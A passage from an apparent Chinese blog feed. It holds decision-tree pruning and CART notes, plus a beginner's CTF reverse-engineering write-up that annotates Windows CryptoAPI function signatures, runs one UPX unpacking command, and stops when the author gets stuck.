scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>，与之前误差率相同。根据奥卡姆剃刀原理，在相同效果下，越简单越好，所以也将它预剪枝。</p><img src="/posts/498ab7d9/5.5.15.png" class="" title="预剪枝"><p>在脐部的特征值为平坦的训练集中，全是坏瓜，没有必要再次做划分。</p><h3 id="5-5-2-后剪枝"><a href="#5-5-2-后剪枝" class="headerlink" title="5.5.2 后剪枝"></a>5.5.2 后剪枝</h3><p>后剪枝的几个方法：</p><ol><li>降低错误剪枝(REP)</li><li>悲观错误剪枝(PEP)</li><li>最小误差剪枝(MEP)</li><li>基于错误的剪枝(EBP)</li><li>代价-复杂度剪枝(CCP)</li></ol><h4 id="5-5-2-1-降低错误剪枝-REP"><a href="#5-5-2-1-降低错误剪枝-REP" class="headerlink" title="5.5.2.1 降低错误剪枝(REP)"></a>5.5.2.1 降低错误剪枝(REP)</h4><img src="/posts/498ab7d9/5.5.16.png" class="" title="降低错误剪枝"><img src="/posts/498ab7d9/5.5.17.png" class="" title="降低错误剪枝"><img src="/posts/498ab7d9/5.5.18.png" class="" title="降低错误剪枝"><p>如果不剪枝，误判个数为2：</p><img src="/posts/498ab7d9/5.5.19.png" class="" title="降低错误剪枝"><p>剪枝后误判个数为1个，所以应该剪枝：</p><img src="/posts/498ab7d9/5.5.20.png" class="" title="降低错误剪枝"><img src="/posts/498ab7d9/5.5.21.png" class="" title="降低错误剪枝"><p>继续看能不能从3层变2层，色泽中的三个特征值有两个判断为好瓜，所以直接将稍蜷缩的判断为好瓜。</p><p>在剪枝前，误判个数为1个：</p><img src="/posts/498ab7d9/5.5.22.png" class="" title="降低错误剪枝"><p>在剪枝后，误判个数为1个：</p><img src="/posts/498ab7d9/5.5.23.png" class="" title="降低错误剪枝"><p>根据奥卡姆剃刀原理，选择剪枝。</p><p>继续看能不能从2层变1层，分别判断色泽特征和根蒂特征。最后可以得出是可以的：</p><img src="/posts/498ab7d9/5.5.24.png" class="" title="降低错误剪枝"><h4 id="5-5-2-2-悲观错误剪枝-PEP"><a href="#5-5-2-2-悲观错误剪枝-PEP" class="headerlink" title="5.5.2.2 悲观错误剪枝(PEP)"></a>5.5.2.2 悲观错误剪枝(PEP)</h4><p>原理：根据剪枝前后的错误率来决定是否剪枝。和REP不同之处在于PEP只需要训练集即可，不需要验证集，并且PEP是自上而下剪枝的。</p><img src="/posts/498ab7d9/5.5.25.png" class="" title="悲观错误剪枝"><p>例子：</p><img src="/posts/498ab7d9/5.3.1.png" class="" title="悲观错误剪枝"><img src="/posts/498ab7d9/5.3.2.png" class="" title="悲观错误剪枝"><img src="/posts/498ab7d9/5.3.2.png" class="" title="悲观错误剪枝"><p>悲观错误剪枝的特点：</p><ul><li>不需要分离剪枝数据集，有利于实例较少的问题</li><li>误差使用了连续修正值，使得适用性更强</li><li>由于自上而下的剪枝策略，PEP效率更高</li><li>可能会修剪不应剪掉的枝条</li></ul><h4 id="5-5-2-3-最小误差剪枝-MEP"><a href="#5-5-2-3-最小误差剪枝-MEP" class="headerlink" title="5.5.2.3 最小误差剪枝(MEP)"></a>5.5.2.3 最小误差剪枝(MEP)</h4><p>原理：根据剪枝前后的最小分类错误概率来决定是否剪枝。自下而上剪枝，只需要训练集即可。</p><img src="/posts/498ab7d9/5.3.4.png" class="" title="最小误差剪枝"><p>在实际操作中，m是选出来，而不是指定的。</p><img src="/posts/498ab7d9/5.3.5.png" class="" title="最小误差剪枝"><p>例子：</p><img src="/posts/498ab7d9/5.3.6.png" class="" title="最小误差剪枝"><h4 id="5-5-2-4-基于错误剪枝-EBP"><a href="#5-5-2-4-基于错误剪枝-EBP" class="headerlink" title="5.5.2.4 基于错误剪枝(EBP)"></a>5.5.2.4 基于错误剪枝(EBP)</h4><p>原理：根据剪枝前后的误判个数来决定是否剪枝。自下而上剪枝，只需要训练集即可。</p><img src="/posts/498ab7d9/5.3.7.png" class="" title="基于错误剪枝"><img src="/posts/498ab7d9/5.3.8.png" class="" title="基于错误剪枝"><img src="/posts/498ab7d9/5.3.9.png" class="" title="基于错误剪枝"><p>例子：</p><img src="/posts/498ab7d9/5.3.10.png" class="" title="基于错误剪枝"><h4 id="5-5-2-5-代价-复杂度剪枝-CCP"><a href="#5-5-2-5-代价-复杂度剪枝-CCP" class="headerlink" title="5.5.2.5 代价-复杂度剪枝(CCP)"></a>5.5.2.5 代价-复杂度剪枝(CCP)</h4><p>原理：根据剪枝前后的损失函数来决定是否剪枝。</p><img src="/posts/498ab7d9/5.3.11.png" class="" title="代价-复杂度剪枝"><img src="/posts/498ab7d9/5.3.12.png" class="" title="代价-复杂度剪枝"><h2 id="5-6-CART算法"><a href="#5-6-CART算法" class="headerlink" title="5.6 CART算法"></a>5.6 CART算法</h2><p>CART算法是二叉决策树。</p><h3 id="5-6-1-树的生成"><a href="#5-6-1-树的生成" class="headerlink" title="5.6.1 树的生成"></a>5.6.1 树的生成</h3><h4 id="5-6-1-1-分类树"><a href="#5-6-1-1-分类树" class="headerlink" title="5.6.1.1 分类树"></a>5.6.1.1 分类树</h4><img src="/posts/498ab7d9/5.6.1.png" class="" title="基尼指数"><p>将甜度特征作为分类：</p><img src="/posts/498ab7d9/5.6.2.png" class="" title="基尼指数例子"><p>将硬度特征作为分类：</p><img src="/posts/498ab7d9/5.6.3.png" class="" title="基尼指数例子"><p>0.48 &gt; 0.17，甜度特征更有利于桃子的分类，因为它的基尼指数更小，分得更彻底。</p><p><strong>CART分类决策树算法</strong>：</p><img src="/posts/498ab7d9/5.6.4.png" class="" title="CART算法"><p>例子：</p><img src="/posts/498ab7d9/5.6.5.png" class="" title="CART算法例子"><img src="/posts/498ab7d9/5.6.6.png" class="" title="CART算法例子"><img src="/posts/498ab7d9/5.6.7.png" class="" title="CART算法例子"><img src="/posts/498ab7d9/5.6.8.png" class="" title="CART算法例子"><p>对比这四个特征的基尼指数，发现第三个特征的基尼指数最小，所以用它作为根结点来进行划分。再来看其它三个特征。</p><img src="/posts/498ab7d9/5.6.9.png" class="" title="CART算法例子"><h4 id="5-6-1-2-回归树"><a href="#5-6-1-2-回归树" class="headerlink" title="5.6.1.2 回归树"></a>5.6.1.2 回归树</h4><img src="/posts/498ab7d9/5.6.10.png" class="" title="回归树模型"><img src="/posts/498ab7d9/5.6.11.png" class="" title="回归树模型"><p><strong>回归树算法</strong>：</p><img src="/posts/498ab7d9/5.6.12.png" class="" title="回归树算法步骤"><h3 id="5-6-2-树的剪枝"><a href="#5-6-2-树的剪枝" class="headerlink" title="5.6.2 树的剪枝"></a>5.6.2 树的剪枝</h3><img src="/posts/498ab7d9/5.6.13.png" class="" title="回归树树的剪枝"><img src="/posts/498ab7d9/5.6.14.png" class="" title="回归树树的剪枝"><h1 id="6-逻辑回归"><a href="#6-逻辑回归" class="headerlink" title="6. 逻辑回归"></a>6. 逻辑回归</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;做机器学习的实验做得我生无可恋，还是先补一下机器学习的几个算法的基本原理再说吧。&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://example.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>2022DASCTF Apr X FATE 防疫挑战赛</title>
    <link href="http://example.com/posts/5850d757.html"/>
    <id>http://example.com/posts/5850d757.html</id>
    <published>2022-04-23T03:23:18.924Z</published>
    <updated>2022-04-25T02:52:44.678Z</updated>
    
    <content type="html"><![CDATA[<p>小菜鸡打CTF。</p><span id="more"></span><h1 id="1-Crackme"><a href="#1-Crackme" class="headerlink" title="1. Crackme"></a>1. Crackme</h1><p>无壳，32位EXE程序。运行一下。</p><img src="/posts/5850d757/1.1.png" class="" title="运行结果"><p>载入IDA，定位关键字符串和定位关键函数。先大概分析一下。</p><img src="/posts/5850d757/1.4.png" class="" title="IDA分析"><img src="/posts/5850d757/1.3.png" class="" title="IDA分析"><img src="/posts/5850d757/1.5.png" class="" title="IDA分析"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取CSP中特定密钥容器的句柄</span></span><br><span class="line">BOOLEAN CRYPTFUNC <span class="title function_">CryptAcquireContext</span><span class="params">(</span></span><br><span class="line"><span class="params">  [out]HCRYPTPROV* phProv,       <span class="comment">//返回csp句柄</span></span></span><br><span class="line"><span class="params">  [in]LPCTSTR pszContainer,      <span class="comment">//密钥容器名称，用于标识CSP的密钥容器</span></span></span><br><span class="line"><span class="params">  [in]LPCTSTR pszProvider,       <span class="comment">//指向CSP名称的字符串指针，如果为NULL，则使用默认的CSP</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwProvType,          <span class="comment">//CSP类型，用于标识CSP容器支持哪些加密算法（加密解密时的具体算法需要看生成密钥的函数才能确定）</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags              <span class="comment">//标志</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//失败返回0，成功返回非0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取CSP哈希对象句柄，可以使用此句柄来哈希数据和会话密钥</span></span><br><span class="line">BOOL CRYPTFUNC <span class="title function_">CryptCreateHash</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTPROV hProv,          <span class="comment">//csp句柄</span></span></span><br><span class="line"><span class="params">  [in]ALG_ID Algid,         　   <span class="comment">//【重要】哈希算法标识(CALG_MD5=0x8003，CALG_SHA_1=0x8004等)</span></span></span><br><span class="line"><span class="params">  [in]HCRYPTKEY hKey,            <span class="comment">//如果哈希算法是密钥哈希，如HMACH或者MAC算法，就用此密钥句柄传递密钥，对于非密钥算法，此参数为NULL</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags,             <span class="comment">//保留，必须为0</span></span></span><br><span class="line"><span class="params">  [out]HCRYPTHASH* phHash        <span class="comment">//返回创建的哈希对象句柄</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算一段数据的哈希值并加入到指定的哈希句柄中</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptHashData</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTHASH hHash,          <span class="comment">//哈希句柄</span></span></span><br><span class="line"><span class="params">  [in]BYTE* pbData,              <span class="comment">//要添加到哈希对象的数据指针</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwDataLen,           <span class="comment">//数据长度</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags              <span class="comment">//标识(所有Microsoft加密服务提供商都忽略此参数)</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从哈希对象中查询指定参数（可以获取CryptHashData哈希结果）</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptGetHashParam</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HCRYPTHASH hHash,    <span class="comment">//哈希句柄</span></span></span><br><span class="line"><span class="params">  [in]      DWORD dwParam,       <span class="comment">//需要获取参数的类型标识（哈希算法=1，哈希值=2，哈希值长度=4）</span></span></span><br><span class="line"><span class="params">  [out]     BYTE *pbData,        <span class="comment">//缓冲区指针</span></span></span><br><span class="line"><span class="params">  [in,out]  DWORD *pdwDataLen,   <span class="comment">//缓冲区长度</span></span></span><br><span class="line"><span class="params">  [in]      DWORD dwFlags        <span class="comment">//保留，必须为0</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁的哈希对象的句柄</span></span><br><span class="line">BOOL <span class="title function_">CryptDestroyHash</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HCRYPTHASH hHash</span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放加密服务提供者(CSP)和密钥容器的句柄</span></span><br><span class="line">BOOL <span class="title function_">CryptReleaseContext</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HCRYPTPROV hProv,</span></span><br><span class="line"><span class="params">  [in] DWORD      dwFlags<span class="comment">//保留，必须为0</span></span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成从基础数据值派生的加密会话密钥</span></span><br><span class="line">BOOL CRYPTFUNC <span class="title function_">CryptDeriveKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTPROV hProv,          <span class="comment">//csp句柄</span></span></span><br><span class="line"><span class="params">  [in]ALG_ID Algid,              <span class="comment">//【重要】用于生成密钥的算法标识(CALG_AES_128=0x660e等)</span></span></span><br><span class="line"><span class="params">  [in]HCRYPTHASH hBaseData,      <span class="comment">//用CryptHashData计算数据哈希后，返回的哈希对象句柄</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags,             <span class="comment">//生成密钥的类型（是否需要补位、密钥是否可以导出等）</span></span></span><br><span class="line"><span class="params">  [out]HCRYPTKEY* phKey          <span class="comment">//返回新生成密钥的句柄指针</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用随机数生成加密会话密钥或公/私钥对</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptGenKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]   HCRYPTPROV hProv,       <span class="comment">//csp句柄</span></span></span><br><span class="line"><span class="params">  [in]   ALG_ID Algid,           <span class="comment">//【重要】指定生成密钥的算法标识(CALG_MD5/CALG_SHA_256等)</span></span></span><br><span class="line"><span class="params">  [in]   DWORD dwFlags,          <span class="comment">//生成密钥的类型（生成会话密钥、密钥是否可以导出等）</span></span></span><br><span class="line"><span class="params">  [out]  HCRYPTKEY *phKey        <span class="comment">//返回创建的密钥句柄</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入加密密钥到csp</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptImportKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_   HCRYPTPROV hProv,       <span class="comment">//csp句柄</span></span></span><br><span class="line"><span class="params">  _In_   BYTE *pbData,           <span class="comment">//密钥缓冲区（由CryptExportKey函数返回）</span></span></span><br><span class="line"><span class="params">  _In_   DWORD dwDataLen,        <span class="comment">//缓冲区长度</span></span></span><br><span class="line"><span class="params">  _In_   HCRYPTKEY hPubKey,      <span class="comment">//用于解密pbData参数的密钥句柄（如果pbData参数指向的密钥未加密，此参数=0）</span></span></span><br><span class="line"><span class="params">  _In_   DWORD dwFlags,          <span class="comment">//该参数仅在将PRIVATEKEYBLOB形式的公钥/私钥对导入到CSP时才使用</span></span></span><br><span class="line"><span class="params">  _Out_  HCRYPTKEY *phKey        <span class="comment">//返回导入密钥后的句柄</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//失败返回0，成功返回非0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出加密密钥到csp</span></span><br><span class="line">BOOL <span class="title function_">CryptExportKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HCRYPTKEY hKey,          <span class="comment">//要导出的密钥句柄</span></span></span><br><span class="line"><span class="params">  [in]      HCRYPTKEY hExpKey,       <span class="comment">//目标用户的密钥句柄，通常为NULL</span></span></span><br><span class="line"><span class="params">  [in]      DWORD     dwBlobType,    <span class="comment">//指定要导出的密钥类型（公钥、私钥等）</span></span></span><br><span class="line"><span class="params">  [in]      DWORD     dwFlags,       <span class="comment">//附加选项，通常为NULL</span></span></span><br><span class="line"><span class="params">  [out]     BYTE      *pbData,       <span class="comment">//接收导出数据的缓冲区，如果为NULL则在pdwDataLen参数中返回需要的长度</span></span></span><br><span class="line"><span class="params">  [in,out]  DWORD     *pdwDataLen    <span class="comment">//缓冲区长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入公钥Key</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptImportPublicKeyInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]   HCRYPTPROV hCryptProv,              <span class="comment">//CSP句柄</span></span></span><br><span class="line"><span class="params">  [in]   DWORD dwCertEncodingType,           <span class="comment">//指定使用的编码类型</span></span></span><br><span class="line"><span class="params">  [in]   PCERT_PUBLIC_KEY_INFO pInfo,        <span class="comment">//CERT_PUBLIC_KEY_INFO结构的地址,其中包含要导入的公钥和算法</span></span></span><br><span class="line"><span class="params">  [out]  HCRYPTKEY *phKey                    <span class="comment">//用于接收导入公钥的句柄</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置密钥参数</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptSetKeyParam</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTKEY hKey,            <span class="comment">//要设置参数的密钥句柄</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwParam,             <span class="comment">//参数类型（例如设置AES_CBC加密算法中的向量IV）</span></span></span><br><span class="line"><span class="params">  [in]BYTE* pbData,              <span class="comment">//参数缓冲区的指针（如果参数类型是向量IV，该缓冲区保存的就是IV值）</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags              <span class="comment">//保留，必须为零</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取密钥参数</span></span><br><span class="line">BOOL CRYPTFUNC <span class="title function_">CryptGetKeyParam</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTKEY hKey,            <span class="comment">//要查询的密钥句柄</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwParam,             <span class="comment">//参数类型</span></span></span><br><span class="line"><span class="params">  [out]BYTE* pbData,             <span class="comment">//参数缓冲区的指针</span></span></span><br><span class="line"><span class="params">  [in,out]DWORD* pdwDataLen,     <span class="comment">//长度</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags              <span class="comment">//保留，必须为零</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密数据</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptEncrypt</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]     HCRYPTKEY hKey,       <span class="comment">//【重要】加密密钥句柄,密钥指定了使用的加密算法（由CryptGenKey或CryptImportKey函数返回）</span></span></span><br><span class="line"><span class="params">  [in]     HCRYPTHASH hHash,     <span class="comment">//哈希对象句柄（如果要同时对数据进行散列和加密，可以使用该参数，否则NULL）</span></span></span><br><span class="line"><span class="params">  [in]     BOOL Final,           <span class="comment">//指定这是否是正在被加密数据的最后一节。如果是最后一部分或唯一的一部分，这个值为真;</span></span></span><br><span class="line"><span class="params">  [in]     DWORD dwFlags,        <span class="comment">//保留，必须为0</span></span></span><br><span class="line"><span class="params">  [in,out]  BYTE *pbData,        <span class="comment">//明文数据缓冲区，加密后保存密文</span></span></span><br><span class="line"><span class="params">  [in,out]  DWORD *pdwDataLen,   <span class="comment">//pbData缓冲区中明文的长度</span></span></span><br><span class="line"><span class="params">  [in]     DWORD dwBufLen        <span class="comment">//pbData缓冲区的总大小（以字节为单位）（根据算法不同，加密文本可能比原始明文大）</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密数据</span></span><br><span class="line">BOOL CRYPTFUNC <span class="title function_">CryptDecrypt</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTKEY hKey,            <span class="comment">//【重要】解密密钥句柄，该密钥指定了要使用的解密算法（由CryptGenKey或CryptImportKey函数返回）</span></span></span><br><span class="line"><span class="params">  [in]HCRYPTHASH hHash,          <span class="comment">//哈希对象句柄，如果不需要散列设置为零</span></span></span><br><span class="line"><span class="params">  [in]BOOL Final,                <span class="comment">//指定这是否是正在被解密数据的最后一节。如果是最后一部分或唯一的一部分，这个值为真;</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags,             <span class="comment">//保留，必须为零</span></span></span><br><span class="line"><span class="params">  [in,out]BYTE* pbData,          <span class="comment">//加密数据缓冲区，解密后保存明文</span></span></span><br><span class="line"><span class="params">  [in,out]DWORD* pdwDataLen      <span class="comment">//缓冲区长度</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放hKey参数引用的句柄</span></span><br><span class="line">BOOL <span class="title function_">CryptDestroyKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HCRYPTKEY hKey</span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码由lpszStructType参数指定的类型数据</span></span><br><span class="line">BOOL <span class="title function_">CryptDecodeObjectEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      DWORD              dwCertEncodingType,    <span class="comment">//使用的编码类型（不重要）</span></span></span><br><span class="line"><span class="params">  [in]      LPCSTR             lpszStructType,        <span class="comment">//【重要】结构体类型常量标识（标识pbEncoded是什么类型的结构体）</span></span></span><br><span class="line"><span class="params">  [in]      <span class="type">const</span> BYTE         *pbEncoded,            <span class="comment">//指向要解码的数据指针（该结构必须是lpszStructType指定的类型）</span></span></span><br><span class="line"><span class="params">  [in]      DWORD              cbEncoded,             <span class="comment">//pbEncoded数据长度</span></span></span><br><span class="line"><span class="params">  [in]      DWORD              dwFlags,               <span class="comment">//可选标识</span></span></span><br><span class="line"><span class="params">  [in]      PCRYPT_DECODE_PARA pDecodePara,           <span class="comment">//指向包含解码段落信息的CRYPT_DECODE_PARA结构的指针。</span></span></span><br><span class="line"><span class="params">  [out]     <span class="type">void</span>               *pvStructInfo,         <span class="comment">//接收解码后数据的缓冲区指针</span></span></span><br><span class="line"><span class="params">  [in,out] DWORD              *pcbStructInfo          <span class="comment">//pvStructInfo缓冲区长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串转换成指定标识的字节数组</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptStringToBinary</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]     LPCTSTR pszString,    <span class="comment">//要转换字符串的指针</span></span></span><br><span class="line"><span class="params">  [in]     DWORD cchString,      <span class="comment">//要转换字符串的长度，不包括终止NULL字符。如果此参数为零，则pszString是以null结尾的字符串。</span></span></span><br><span class="line"><span class="params">  [in]     DWORD dwFlags,        <span class="comment">//转换标识（ASCII、十六进制、Base64等）</span></span></span><br><span class="line"><span class="params">  [in]     BYTE *pbBinary,       <span class="comment">//接收转换后数据的缓冲区指针（如果为NULL则自动计算pcbBinary长度）</span></span></span><br><span class="line"><span class="params">  [in,out] DWORD *pcbBinary,     <span class="comment">//pbBinary参数长度（以字节为单位，如果为0则忽略pbBinary参数）</span></span></span><br><span class="line"><span class="params">  [out]    DWORD *pdwSkip,       <span class="comment">//可选参数</span></span></span><br><span class="line"><span class="params">  [out]    DWORD *pdwFlags       <span class="comment">//可选参数</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/alg-id?redirectedfrom=MSDN">ALG_ID 标识符与值的映射表</a></p><p>经过综上分析，可以总结：</p><img src="/posts/5850d757/1.2.1.png" class="" title="IDA分析"><h1 id="2-FakePica"><a href="#2-FakePica" class="headerlink" title="2. FakePica"></a>2. FakePica</h1><p>运行一下啥都没发生。</p><img src="/posts/5850d757/2.1.png" class="" title="运行程序"><p>载入AK，发现找不到入口文件。但看到它有so文件。</p><img src="/posts/5850d757/2.2.png" class="" title="AK"><img src="/posts/5850d757/2.3.png" class="" title="AK"><p>解包将so文件载入IDA查看导出表，发现好乱…应该是混淆了。</p><img src="/posts/5850d757/2.4.png" class="" title="IDA"><img src="/posts/5850d757/2.5.png" class="" title="IDA"><h1 id="3-奇怪的交易"><a href="#3-奇怪的交易" class="headerlink" title="3. 奇怪的交易"></a>3. 奇怪的交易</h1><p>一个有UPX壳的64位ELF文件，直接拿去kali脱壳。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d trade</span><br></pre></td></tr></table></figure><p>脱壳后载入IDA没有找到关键字符串。</p><p>无从下手啊，等大佬们的wp。。。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;小菜鸡打CTF。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络</title>
    <link href="http://example.com/posts/e255a10a.html"/>
    <id>http://example.com/posts/e255a10a.html</id>
    <published>2022-04-22T11:24:40.879Z</published>
    <updated>2022-05-15T02:35:58.389Z</updated>
    
